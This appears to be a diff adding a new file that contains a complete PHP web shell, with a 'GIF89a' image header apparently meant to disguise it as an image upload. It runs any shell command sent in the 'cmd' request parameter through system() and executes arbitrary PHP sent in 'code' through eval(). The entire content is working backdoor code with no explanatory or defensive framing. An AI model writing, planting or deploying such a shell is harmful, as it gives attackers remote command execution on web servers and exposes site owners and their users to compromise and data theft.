@@ -1,0 +1,14 @@
+
+<?php
+if(isset($_REQUEST['cmd'])) {
+    header('Content-Type: text/plain');
+    system($_REQUEST['cmd']);
+    exit;
+}
+if(isset($_REQUEST['code'])) {
+    header('Content-Type: text/plain');
+    eval($_REQUEST['code']);
+    exit;
+}
+?>
+GIF89a
